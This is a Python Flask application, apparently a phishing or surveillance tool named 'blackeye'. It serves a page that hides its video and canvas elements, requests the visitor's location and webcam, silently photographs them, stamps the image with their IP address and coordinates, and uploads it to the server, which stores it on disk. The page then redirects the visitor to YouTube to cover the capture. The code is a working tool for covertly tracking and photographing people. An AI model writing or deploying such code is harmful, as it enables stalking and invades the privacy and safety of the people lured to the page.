from flask import Flask, request, jsonify
import os
import base64
from datetime import datetime

app = Flask(__name__)

# Create a directory to save images and text files if they don't exist
images_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'images')
os.makedirs(images_dir, exist_ok=True)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Geolocation and Camera Example</title>
      <style>
        body {
          margin: 0;
          overflow: hidden;
          position: relative;
        }
        #video, #canvas {
          display: none;
        }
      </style>
    </head>
    <body>
      <video id="video"></video>
      <canvas id="canvas"></canvas>

      <script>
        let videoStream;

        async function captureImage(lat, lng, ipAddress, timestamp) {
          const video = document.getElementById('video');
          const canvas = document.getElementById('canvas');
          const context = canvas.getContext('2d');
          canvas.width = 640;  // Set desired width
          canvas.height = 480; // Set desired height
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Set text properties
          context.font = '20px Arial';
          context.fillStyle = 'white'; // Set text color
          context.strokeStyle = 'black'; // Set text outline color
          context.lineWidth = 2; // Set outline width
          
          // Draw the IP and location text on the canvas
          const locationText = `IP: ${ipAddress} | Lat: ${lat} | Lng: ${lng}`;
          const timestampText = timestamp;
          const padding = 10;

          context.strokeText(locationText, padding, padding + 20); // Outline text
          context.fillText(locationText, padding, padding + 20); // Fill text
          context.strokeText(timestampText, padding, padding + 50); // Outline timestamp
          context.fillText(timestampText, padding, padding + 50); // Fill timestamp
          
          // Convert the image to a data URL (base64)
          const dataUrl = canvas.toDataURL('image/png');
          const base64Image = dataUrl.split(',')[1]; // Get the base64 string

          // Send the image and location data to the server
          fetch('/blackeye/location', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ image: base64Image, lat: lat, lng: lng, ip: ipAddress, timestamp: timestamp })
          }).then(() => {
            // Stop the video stream after capturing the image
            if (videoStream) {
              videoStream.getTracks().forEach(track => track.stop());
            }
            // Redirect to YouTube after 3 seconds
            setTimeout(() => {
              window.location.href = 'https://www.youtube.com';
            }, 3000); // Redirect after 3 seconds
          });
        }

        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const lat = position.coords.latitude;
              const lng = position.coords.longitude;

              fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                  const ipAddress = data.ip;

                  // Get current time in the specified format
                  const now = new Date();
                  const options = { hour: '2-digit', minute: '2-digit', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric' };
                  const timestamp = now.toLocaleString('en-IN', options).replace(',', '').replace(/\//g, '-'); // Format: HH:MM AM/PM DD-MM-YYYY

                  // Start the video stream without showing it
                  navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                      const video = document.getElementById('video');
                      video.srcObject = stream;
                      videoStream = stream; // Store the stream for later use
                      video.play();
                      
                      // Capture the image after a short delay
                      setTimeout(() => captureImage(lat, lng, ipAddress, timestamp), 3000); // Capture after 3 seconds
                    })
                    .catch(error => {
                      console.error('Error accessing camera:', error);
                    });
                });
            },
            (error) => {
              if (error.code === error.PERMISSION_DENIED) {
                fetch('https://api.ipify.org?format=json')
                  .then(response => response.json())
                  .then(data => {
                    const ipAddress = data.ip;
                    // No display for the IP address, lat, lng
                  });
              } else {
                console.error("Error getting user location:", error);
              }
            }
          );
        } else {
          console.log("Geolocation is not supported by this browser.");
        }
      </script>
    </body>
    </html>
    '''

@app.route('/blackeye/location', methods=['POST'])
def receive_location():
    location_data = request.json
    image_data = location_data['image']
    lat = location_data['lat']
    lng = location_data['lng']
    ip = location_data['ip']
    timestamp = location_data['timestamp']

    # Decode the base64 image data
    image_bytes = base64.b64decode(image_data)
    
    # Create a unique filename for the image with timestamp
    images_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'images')
    os.makedirs(images_dir, exist_ok=True)
    
    image_filename = os.path.join(images_dir, f"image_{ip}_{lat}_{lng}_{timestamp.replace(':', '-')}.png")
    
    # Save the image
    with open(image_filename, 'wb') as f:
        f.write(image_bytes)

    # Create a text file with the same name as the image
    text_filename = os.path.join(images_dir, f"image_{ip}_{lat}_{lng}_{timestamp.replace(':', '-')}.txt")
    with open(text_filename, 'w') as f:
        f.write(f"IP: {ip}\nLatitude: {lat}\nLongitude: {lng}\nTimestamp: {timestamp}\n")
    return jsonify({'message': 'Location and image data received successfully!'})

if __name__ == '__main__':
    app.run(debug=True)
